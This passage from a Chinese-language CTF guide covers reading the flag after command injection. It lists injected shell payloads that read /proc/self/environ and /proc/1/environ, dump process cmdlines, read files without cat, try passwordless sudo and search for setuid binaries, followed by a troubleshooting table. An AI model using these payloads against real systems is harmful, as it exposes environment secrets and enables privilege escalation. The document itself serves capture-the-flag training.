很多平台把 flag 通过环境变量或命令行参数传进容器，`cat /flag` 找不到不代表没有：
```bash
; env | grep -i flag
; cat /proc/self/environ        # 当前进程环境变量原文
; cat /proc/1/environ           # 容器 PID 1 的环境变量
; cat /proc/self/cmdline        # 进程启动参数（可能带 flag）
```
**预期结果**：`FLAG=flag{...}` 或 cmdline 里的 flag。**如果不行**：也没有，别放弃，flag 可能加了花名（如 `ctf{...}` → `grep -i 'ctf\|flag'`），或藏在 /proc 其他位置，回到第 2 步用 `find / -name '*{*' 2>/dev/null` 扫花括号文件。

#### 第 5 步：无 cat 环境的兜底组合（命令被滤/没装 cat）
读文件不只有 cat，一条命令一条命令试，命中即止：
```bash
; tac /flag 2>/dev/null || head -1 /flag
; strings /flag 2>/dev/null
; cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null
; cat /proc/self/environ 2>/dev/null
```
**预期结果**：四选一输出 flag（tac 倒序、head 首行、strings 提取可打印串，内容都在）。**如果不行**：输出为空可能被 `2>/dev/null` 吞了错误信息，去掉它重跑一次看真实报错（no such file / permission denied 会告诉你该往哪找）。

#### 第 6 步：权限不够时的处理
非 root 用户读不到 `/flag`（Permission denied）时：
```bash
; ls -la /flag                  # 看权限归属
; sudo cat /flag 2>/dev/null    # 有 sudo 就试（无密码免密 sudo）
; find / -perm -4000 -type f 2>/dev/null   # 找 setuid 提权点
```
**预期结果**：要么直接读出，要么发现可提权路径。**如果不行**：权限路径复杂，flag 大概率改放环境变量或别的用户目录（试 `/home/*/flag`、`/tmp/*`），或把目标转向提权（这超出本条目范围，先保住已有发现）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `cat /flag` 报 Permission denied | 当前用户非 root，/flag 只读给 root | `sudo cat` / 找 setuid / 转环境变量 |
| find 扫完没有输出 | `2>/dev/null` 连报错一起吞了 | 去掉重定向看真实报错 |
| 四条固定路径都不中 | flag 命名特殊（如 `flag{` 开头文件） | `find / -name '*flag*' -o -name '*ctf*'` |
| `env` 输出里没有 flag | 环境变量名字不含 flag | `env` 全量看（flag 可能叫 `MISC_FLAG`、`KEY`） |
| tac/head/strings 全部失败 | 目标 shell 或命令环境受限 | 回到 [cmdi-bypass-space]/[cmdi-bypass-char] 构造 cat |
| echo/cat 输出被截断 | 回显行数限制大文件 | 只取关键：`grep -E 'flag|ctf|KEY' /flag` |

#### 实战要点
- 固定路径快枪顺序：`/flag` → `/flag.txt` → `/root/flag` → 环境变量；find 永远是兜底不是首选。
- `env` + `grep -i flag` + `/proc/self/environ` 三连是「找不到文件」时的第二战场，别漏。
- 无 cat 时 strings/tac/head 覆盖绝大多数读取场景，`2>/dev/null` 只在确信路径存在时加。
- 读到的 flag 全格式保留（可能含换行/花括号），提交前手动核对。
- 命令全被滤时回到 [cmdi-bypass-char] 构造，命令被滤空格时回 [cmdi-bypass-space]——读 flag 是终点，绕过是途中。
